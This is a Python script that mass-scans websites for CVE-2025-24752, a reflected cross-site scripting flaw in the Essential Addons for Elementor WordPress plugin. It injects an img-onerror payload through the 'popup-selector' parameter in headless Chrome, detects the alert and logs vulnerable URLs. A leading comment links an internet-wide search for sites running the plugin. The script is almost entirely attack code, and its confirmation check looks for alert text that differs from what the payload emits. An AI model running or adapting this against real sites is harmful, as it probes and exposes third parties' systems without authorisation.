# https://app.netlas.io/responses/?q=http.body%3A%22%2Fplugins%2Fessential-addons-for-elementor-lite%22&page=1&indices=

import sys
import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import (TimeoutException, 
                                       UnexpectedAlertPresentException,
                                       NoAlertPresentException,
                                       WebDriverException)

# Suppress logging
import logging
from selenium.webdriver.remote.remote_connection import LOGGER
LOGGER.setLevel(logging.WARNING)
os.environ['WDM_LOG_LEVEL'] = '0'
os.environ['WDM_PRINT_FIRST_LINE'] = 'False'

def configure_driver():
    """Configure and return a reusable Chrome Service instance"""
    chrome_service = Service(ChromeDriverManager().install())
    
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--ignore-certificate-errors")
    chrome_options.add_argument("--ignore-ssl-errors")
    chrome_options.add_argument("--log-level=3")
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    
    # Performance optimizations
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--disable-notifications")
    chrome_options.add_argument("--disable-browser-side-navigation")
    chrome_options.add_argument("--dns-prefetch-disable")
    
    return chrome_service, chrome_options

def check_xss(url, chrome_service, chrome_options):
    """Check XSS vulnerability with optimized parameters"""
    payload = '<img src=x onerror=alert("0xlipon")>'
    payload_url = f"{url}?popup-selector={payload}&eael-lostpassword=1"
    payload_url = payload_url.replace(' ', '%20').replace('<', '%3C').replace('>', '%3E')
    
    driver = webdriver.Chrome(service=chrome_service, options=chrome_options)
    driver.set_page_load_timeout(7)  # Reduced from 10 seconds
    
    try:
        driver.get(payload_url)
        
        # Directly check for alert without initial sleep
        try:
            WebDriverWait(driver, 2.5).until(EC.alert_is_present())
            alert = driver.switch_to.alert
            alert_text = alert.text
            alert.accept()
            
            if "chirgart" in alert_text:
                print(f"[VULNERABLE] XSS confirmed on: {url}")
                with open("confirmed-xss.txt", "a") as f:
                    f.write(f"{url}\n")
                return True
        except (TimeoutException, NoAlertPresentException):
            return False
        except UnexpectedAlertPresentException:
            print(f"[VULNERABLE] XSS confirmed on: {url} (unexpected alert)")
            with open("found-vuln-fully.txt", "a") as f:
                f.write(f"{url}\n")
            return True
            
    except TimeoutException:
        print(f"[TIMEOUT] Error: Timed out: {url}")
        return False
    except Exception as e:
        error_msg = str(e).split('\n', 1)[0]
        print(f"[ERROR] {error_msg}")
        return False
    finally:
        driver.quit()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 CVE-2025-24752.py <urls_list>")
        sys.exit(1)

    # Initialize driver components once
    service, options = configure_driver()
    input_arg = sys.argv[1].rstrip('/')

    if input_arg.endswith('.txt'):
        try:
            with open(input_arg, "r", encoding="utf-8") as f:
                urls = [line.strip().rstrip('/') for line in f if line.strip()]
            
            print(f"Loaded {len(urls)} URLs to test")
            vulnerable_count = 0
            
            for i, url in enumerate(urls):
                print(f"[{i+1}/{len(urls)}] Testing: {url}")
                try:
                    if check_xss(url, service, options):
                        vulnerable_count += 1
                except Exception as e:
                    print(f"[ERROR] {str(e).split('\n', 1)[0]}")
                
            print(f"\nResults: {vulnerable_count}/{len(urls)} vulnerable sites found")
            
        except Exception as e:
            print(f"File error: {str(e).split('\n', 1)[0]}")
    else:
        check_xss(input_arg, service, options)
